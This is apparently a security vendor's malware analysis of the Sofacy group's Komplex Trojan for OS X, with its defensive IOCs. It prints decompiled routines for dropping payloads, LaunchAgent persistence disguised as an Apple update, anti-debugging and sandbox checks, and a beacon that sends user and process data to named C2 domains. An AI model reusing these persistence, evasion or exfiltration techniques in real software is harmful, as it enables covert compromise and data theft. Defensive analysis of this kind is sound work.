During our analysis, we determined that Komplex was used in a previous attack campaign targeting\nindividuals running OS X that exploited a vulnerability in the MacKeeper antivirus application to deliver Komplex as\na payload. Komplex shares a significant amount of functionality and traits with another tool used by Sofacy – the\n[Carberp variant that Sofacy had used in previous attack campaigns on systems running Windows. In addition to](http://researchcenter.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/)\nshared code and functionality, we also discovered Komplex command and control (C2) domains that overlapped\nwith previously identified phishing campaign infrastructures associated with the Sofacy group.\n\n## Komplex Binder\n\nKomplex is a Trojan that the Sofacy group created to compromise individuals using OS X devices. The Trojan has\nmultiple parts, first leading with a binder component that is responsible for saving a second payload and a decoy\ndocument to the system. We found three different versions of the Komplex binder, one that was created to run on\nx86, another on x64, and a third that contained binders for both x86 and x64 architectures. We found the following\nsamples of the Komplex binder:\n\n\n1\n2\n3\n4\n5\n6\n\n\n2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134: Mach-O 64bit executable x86_64\nc1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7: Mach-O\nexecutable i386\ncffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4: Mach-O\nuniversal binary with 2 architectures\n\n\nRegardless of architecture, these initial binders all save a second embedded Mach-O file to ‘/tmp/content’. This file\nis the Komplex dropper used in the next stage of installation and to maintain persistence. After saving the Komplex\ndropper, these binders would then save a legitimate decoy document to the system and open them using the\n‘Preview’ application to minimize suspicion of any malicious activity. Figure 1 shows the main function found in one\nof the initial droppers that saves and opens a PDF decoy, as well as executes another executable file saved as\n‘/tmp/content’.\n\n\n-----\n\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nvar_28 = [[NSAutoreleasePool alloc] init];\nvar_38 = [NSSearchPathForDirectoriesInDomains(0xf, 0x1, 0x1) objectAtIndex:0x0];\nvar_40 = [NSString stringWithFormat:@\"%@/roskosmos_2015-2025.pdf\", var_38];\nvar_48 = [NSString stringWithFormat:@\"SetFile -a E %@/roskosmos_2015-2025.pdf\",\nvar_38];\nvar_50 = [NSString stringWithFormat:@\"rm -rf %@/roskosmos_2015-2025.app\", var_38];\nvar_58 = [NSString stringWithFormat:@\"open -a Preview.app %@/roskosmos_20152025.pdf\", var_38];\n[[NSData dataWithBytes:_joiner length:0x20f74] writeToFile:@\"/tmp/content\"\natomically:0x1];\nsystem([var_50 UTF8String]);\nsystem(\"chmod 755 /tmp/content\");\n[[NSData dataWithBytes:_pdf length:0x182c82] writeToFile:var_40 atomically:0x1];\nsystem([var_48 UTF8String]);\nvar_70 = [[NSTask alloc] init];\n[var_70 setLaunchPath:@\"/tmp/content\"];\n[var_70 launch];\n[var_70 waitUntilExit];\nsystem([var_58 UTF8String]);\nremove(*arg1);\n[var_28 release];\nreturn 0x0;\n}\n\n\n_Figure 1 Main function within the Komplex binder_\n\nThe binder component saves a decoy document named roskosmos_2015-2025.pdf to the system and opens it using\nthe Preview application built into OS X. Figure 2 shows a portion of the 17 page decoy document. This document is\ntitled “Проект Федеральной космической программы России на 2016 – 2025 годы” and describes the Russian\nFederal Space Program’s projects between 2016 and 2025. We do not have detailed targeting information regarding\nthe Sofacy group’s attack campaign delivering Komplex at this time; however, based on the contents of the decoy\ndocument, we believe that the target is likely associated with the aerospace industry.\n\n\n-----\n\n_Figure 2 Decoy document opened by Komplex binder showing document regarding the Russian Space Program_\n\n## Komplex Dropper\n\nThe Komplex dropper component is saved to the system as “/tmp/content” (SHA256:\n96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3) and is responsible for installing a third\nexecutable to the system and setting up persistence for the third executable to launch each time the OS X operating\nsystem starts. This dropper also provided the basis for the name “Komplex”, which is seen in several folder paths\nthat were included within the Mach-O file, such as “/Users/kazak/Desktop/Project/komplex”.\n\nThe Komplex dropper is fairly straightforward from a functional perspective, as it contains all of its functionality\nwithin its “_main” function. The “_main” function (Figure 3) accesses data within three variables named\n‘_Payload_1’, ‘_Payload_2’ and ‘_Payload_3’, and writes them to three files on the system.\n\n\n-----\n\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nvar_38 = [[NSAutoreleasePool alloc] init];\nvar_40 = [NSData dataWithBytes:_Payload_1 length:0x15c1c];\nvar_48 = [NSData dataWithBytes:_Payload_2 length:0x201];\nvar_50 = [NSData dataWithBytes:_Payload_3 length:0x4c];\nsystem(\"mkdir -p /Users/Shared/.local/ &> /dev/null\");\nsystem(\"mkdir -p ~/Library/LaunchAgents/ &> /dev/null\");\n[var_40 writeToFile:@\"/Users/Shared/.local/kextd\" atomically:0x1];\n[var_48 writeToFile:@\"/Users/Shared/com.apple.updates.plist\"\natomically:0x1];\n[var_50 writeToFile:@\"/Users/Shared/start.sh\" atomically:0x1];\nsystem(\"cp /Users/Shared/com.apple.updates.plist\n$HOME/Library/LaunchAgents/ &>/dev/null\");\nremove(\"/Users/Shared/com.apple.updates.plist\");\nsystem(\"chmod 755 /Users/Shared/.local/kextd\");\nsystem(\"chmod 755 /Users/Shared/start.sh\");\nvar_58 = [[NSTask alloc] init];\n[var_58 setLaunchPath:@\"/Users/Shared/start.sh\"];\n[var_58 launch];\n[var_58 waitUntilExit];\nremove(\"/Users/Shared/start.sh\");\nremove(*arg1);\n[var_38 release];\nreturn 0x0;\n}\n\n\n_Figure 3 Komplex Dropper’s main function that drops three files to the system and runs a shell script_\n\nThe “_main” function writes the data within ‘_Payload_1’, ‘_Payload_2’, and ‘_Payload_3’ variables to the following\nfiles, respectively:\n\n1. /Users/Shared/.local/kextd (SHA256:\n\n227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5)\n\n2. /Users/Shared/com.apple.updates.plist (SHA256:\n\n1f22e8f489abff004a3c47210a9642798e1c53efc9d6f333a1072af4b11d71ef)\n\n3. /Users/Shared/start.sh (SHA256:\n\nd494e9f885ad2d6a2686424843142ddc680bb5485414023976b4d15e3b6be800)\n\nThe shell script saved to ‘/Users/Shared/start.sh’ calls the system command ‘launchctl’ to add a plist entry into\n‘launchd’ to automatically execute the Komplex payload each time the system starts. Figure 4 shows the contents of\nthe ‘start.sh’ script that sets up persistence for the payload.\n\n\n1\n2\n\n\n#!/bin/sh\nlaunchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist\n\n\n_Figure 4 Contents of the start.sh shell script that calls launchctl_\n\nThe ‘start.sh’ script loads ‘com.apple.updates.plist’, which sets the properties of the Komplex payload that is\nexecuted from “/Users/Shared/.local/kextd” at system start up courtesy of the “RunAtLoad” parameter.

The dropper\ncomponent saves the payload to “/Users/Shared/.local/kextd” (SHA256:\n227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5) and ultimately executes the payload.\nThe payload begins by conducting an anti-debugging check to see if it is being debugged before proceeding with\nexecuting its main functionality, which can be seen in the “AmIBeingDebugged” function in Figure 6. The\n“AmIBeingDebugged” function uses the “sysctl” function to check to see if a specific “P_TRACED” flag is set, which\nsignifies that the process is being debugged. A particularly interesting part of this function is that it is very similar to\n[the function provided by Apple to its developers in a guide created in 2004 titled “Detecting the Debugger”. This is](https://developer.apple.com/library/content/qa/qa1361/_index.html)\nnot the first time the Sofacy group’s malware authors have obtained techniques from publicly available sources, as\n[demonstrated in the use of the Office Test Persistence Method that they obtained from a blog posted in 2014.](http://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/)\n\n\n-----\n\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nvar_8 = **__stack_chk_guard;\ngetpid();\nif ((((sysctl(0x1, 0x4, var_2A8, 0x288, 0x0, 0x0) == 0x0 ? 0x1 : 0x0) ^ 0x1) & 0x1\n& 0xff) != 0x0) {\nrax = __assert_rtn(\"AmIBeingDebugged\",\n\"/Users/user/Desktop/LoaderWinApi/LoaderWinApi/main.mm\", 0x21, \"junk == 0\");\n}\nelse {\nvar_2C1 = (0x0 & 0x800) != 0x0 ? 0x1 : 0x0;\nif (**__stack_chk_guard == var_8) {\nrax = var_2C1 & 0x1 & 0xff;\n}\nelse {\nrax = __stack_chk_fail();\n}\n}\nreturn rax;\n}\n\n\n_Figure 6 The AmIBeingDebugged function used as an anti-analysis technique_\n\nAfter determining that it is not running in a debugger, the payload performs an anti-analysis/sandbox check by\nissuing a GET request to Google, to check for Internet connectivity. The payload will sleep until it receives a\nresponse from the HTTP requests to Google, which means Komplex will only communicate to its C2 servers in\nInternet enabled environments. Figure 7 shows the “connectedToInternet” function that confirms whether the\npayload is able to communicate with “http://www.google.com” before carrying out its functionality.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nint connectedToInternet()() {\nif ([NSData dataWithContentsOfURL:[NSURL\nURLWithString:@\"http://www.google.com\"]] != 0x0) {\nvar_1 = 0x1;\n}\nelse {\nvar_1 = 0x0;\n}\nrax = var_1 & 0x1 & 0xff;\nreturn rax;\n}\n\n\n_Figure 7 The connectedToInternet function testing for an active Internet connection_\n\nAfter confirming an active Internet connection, the Komplex payload begins carrying out its main functionality. The\nKomplex payload uses an 11-byte XOR algorithm to decrypt strings used for configuration and within C2\ncommunications, including the C2 domains themselves. Figure 8 shows a screenshot of Komplex’s custom string\ndecryption algorithm, along with the XOR key used to decrypt strings within the payload.\n\n\n-----\n\n_Figure 8 11-byte XOR algorithm used by Komplex to decrypt configuration strings_\n\nThe algorithm seen in Figure 8 decrypts the strings seen in Table 1, which the payload references using the\nassociated variable names. The payload uses these decrypted strings for a variety of purposes, such as command\nparsing and C2 server locations.\n\n**Variable Name** **Decrypted String**\n\nFILE_NAME FileName\n\nPATHTOSAVE PathToSave\n\nSTART_BLOCK_FILE [file]\n\nBLOCK_EXECUTE Execute\n\nBLOCK_DELETE Delete\n\nEND_BLOCK_FILE [/file]\n\nSERVERS appleupdate[.]org, apple-iclouds[.]net, itunes-helper[.]net\n\nMAC mac\n\nCONFIG config\n\nGET_CONFIG 1\n\nFILES file\n\nLOG log\n\nOLD_CONFIG 2\n\n\n-----\n\nEXTENSIONS .xml .pdf, .htm, .zip\n\n_Table 1 Strings decrypted by Komplex and their referenced name_\n\nThe Komplex payload uses the SERVERS variable to obtain the location of its C2, which it communicates with using\nHTTP POST requests. The payload generates a URL to communicate with its C2 server that has the following\nstructure:\n\n/<random path>/<random string>.<chosen extension>/?<random string>=<encrypted token>\n\nThe <chosen extension> portion of the URL is chosen at random from the list of legitimate file extensions: .xml, .zip,\n.htm and .pdf. The <encrypted token> within the parameters of the URL is base64 encoded ciphertext created from\nthe string ‘h8sn3vq6kl’. The ciphertext of the string is generated via a custom algorithm that uses a random 4-byte\ninteger as a key that is modified by XOR with the static value 0xE150722. The payload also encrypts the data sent\nwithin the POST request using the same algorithm and encodes it using base64. Figure 9 below shows an example\nHTTP POST sent from the payload to its C2 server.\n\n_Figure 9 Beacon sent from Komplex to C2 containing system information within the HTTP POST data_\n\nThe HTTP POST data in Figure 9 is comprised of information that the malware collects from the infected system.\nThe system information sent to the C2 includes data such as the system version, username, and process list, which\nis gathered within a function named “getOsInfo” within the “InfoOS” class (Figure 10).\n\n\n-----\n\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nvar_38 = rdi;\nvar_18 = [[NSProcessInfo processInfo] operatingSystemVersionString];\nvar_20 = NSUserName();\nvar_28 = InfoOS::getProcessList();\nvar_30 = operator new[](strlen(var_28) + 0x200);\nsprintf(var_30, \"Mac OS X - %s %s\\nUser name - %s\\n\\t\\t\\t\\t\\t\\tProcess\nlist :\\n\\n%s\", [var_18 UTF8String], InfoOS::bitOS(), [var_20 UTF8String],\nvar_28);\nrax = var_30;\nreturn rax;\n}\n\n\n_Figure 10 getOsInfo function within Komplex that gathers system information for C2 beacon_\n\nThe Sofacy C2 server will respond to this HTTP request with encrypted data that the payload will decrypt using the\nsame custom algorithm used to encrypt the POST data. The Komplex payload will parse the C2 response for the\nfollowing strings: “[file]” and “[/file]”, “FileName=”, “PathToSave=”, “Shell=”, “Execute”, and “Delete”. The “Delete”\naction does nothing more than delete a file specified by ‘PathToSave’/’FileName’, whereas the “Execute” action\ninvolves running the following system commands before executing the specified file:\n\n\n1\n2\n\n\nmkdir -p &lt;'PathToSave'&gt; &amp;&gt; /dev/null\nchmod 755 &lt;'PathToSave'&gt;/&lt;'FileName'&gt; &amp;&gt; /dev/null\n\n\nThe payload will treat “[file]” and “[/file]” as delimiters that specify the data that the payload should write to a\nspecified file, which allows the threat actor to download additional files to the system. Lastly, the payload can\nexecute commands on the compromised system specified within the “Shell” field, which the payload will execute and\nthen send results back to the C2.\n\n## Connections to Sofacy and Previous Attacks.\n\n**Code Overlaps**\n\nWhile reverse engineering the Komplex payload, we came across a few code overlaps that we believed were worth\nexploring. First, we noticed striking similarities between the Komplex payload and the traits and behavior of an OS X\n[Trojan discussed in a BAE Systems blog titled NEW MAC OS MALWARE EXPLOITS MACKEEPER. According to](http://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html)\nthis blog post, an OS X Trojan was delivered via a vulnerability in the MacKeeper application. The nameless OS X\nTrojan uses an 11-byte XOR algorithm to decrypt an embedded configuration, which has all of the same variable\nnames and values as the Komplex sample (see Table 1). The algorithm used to encrypt and decrypt the network\ntraffic, as well as all static elements of the network communications (composition of URL, structure of HTTP data,\ncommand parsing procedure, etc.) discussed in the blog post are the exact same as seen in the Komplex payload.\nThese overlaps suggest that the Trojan delivered by the MacKeeper vulnerability was in fact the Komplex Trojan.\n\nThe second code overlap ties the Komplex Trojan to Sofacy’s Carberp variant, which we have analyzed in previous\nresearch efforts. Even though Komplex was created to run on OS X and Sofacy’s Carberp variant was developed to\nrun on Windows, they share many commonalities, including:\n\nSame URL generation logic using random path values, a random file extension and encrypted token\n\nSame file extensions used in C2 URL that are listed within the binaries in the same order\n\nSame algorithm used to encrypt and decrypt the token in the URL and HTTP POST data (Carberp key is\nmodified using value 0xAA7D756 whereas Komplex uses 0xE150722)\n\n\n-----\n\nPathToSave.\n\nChecks for Internet connectivity by connecting to google.com\n\nUses an 11-byte XOR key to decrypt strings within the configuration\n\nIn addition to these common traits, we found a Sofacy Carberp variant (SHA256:\n638e7ca68643d4b01432f0ecaaa0495b805cc3cccc17a753b0fa511d94a22bdd) using the same TOKEN value of\n‘h8sn3vq6kl’ within its C2 URL, as observed in Komplex payloads. Based on these observations, we believe that the\nauthor of Sofacy’s Carberp variant used the same code, or at least the same design, to create the Komplex Trojan. A\nbenefit of retaining many of the same functionalities within the Windows and OS X Trojans is that it would require\nfewer alterations to the C2 server application to handle cross-platform implants.\n\n**Infrastructure Overlap**\n\nWhile Komplex’s C2 domain appleupdate[.]org does not appear to have any previously known activity associated\nwith it, both the apple-iclouds[.]net and itunes-helper[.]net domains have direct ties to Sofacy activity. The apple[iclouds[.]net domain is mentioned within a PwC Tactical Intelligence Bulletin that discussed a phishing campaign](http://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing.pdf)\nconducted by the Sofacy group. The itunes-helper[.]net domain is associated with separate activity discussed in\n[Trend Micro’s blog titled Looking Into a Cyber-Attack Facilitator in the Netherlands that included research on hosting](http://blog.trendmicro.com/trendlabs-security-intelligence/looking-into-a-cyber-attack-facilitator-in-the-netherlands/)\nproviders used by Pawn Storm (Sofacy).\n\nThe domain appleupdate[.]org does have one interesting correlation point, specifically involving the IP\n185.10.58[.]170 that resolved this domain between April 2015 through April 2016. Researchers at BAE Systems\nprovided Unit 42 the Komplex payload delivered through the exploitation of MacKeeper (Dropper SHA256:\nda43d39c749c121e99bba00ce809ca63794df3f704e7ad4077094abde4cf2a73 and Payload SHA256:\n45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54), which used the IP address\n185.10.58[.]170 within its configuration as a C2 server. This infrastructure overlap further strengthens the\nconnection between the Komplex payload we discovered with the prior campaign using MacKeeper for delivery.\n\n## Conclusion\n\nThe Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system – a\nmove that showcases their continued evolution toward multi-platform attacks. The tool is capable of downloading\nadditional files to the system, executing and deleting files, as well as directly interacting with the system shell. While\ndetailed targeting information is not currently available, we believe Komplex has been used in attacks on individuals\nrelated to the aerospace industry, as well as attacks leveraging an exploit in MacKeeper to deliver the Trojan. The\nKomplex Trojan revealed a design similar to Sofacy’s Carberp variant Trojan, which we believe may have been done\nin order to handle compromised Windows and OS X systems using the same C2 server application with relative\nease.\n\nWhile Unit 42 continues to research and track this threat, Palo Alto Networks customers are protected via the\nfollowing:\n\nWildFire correctly identifies known Komplex executables as malicious\n\nIPS signature #14442 Sofacy.Gen Command And Control Traffic can detect and block outbound C2 requests\ngenerated by the Komplex Trojan.\n\nCustomers can track this Trojan via the [Komplex tag in AutoFocus.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Komplex)\n\n## IOCs:\n\n\n-----\n\nc1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7\ncffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4\n96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3\n227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5\n45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54\n\n**C2 Locations:**\nappleupdate[.]org\napple-iclouds[.]net\nitunes-helper[.]net\n185.10.58.170\n\n\n-----",
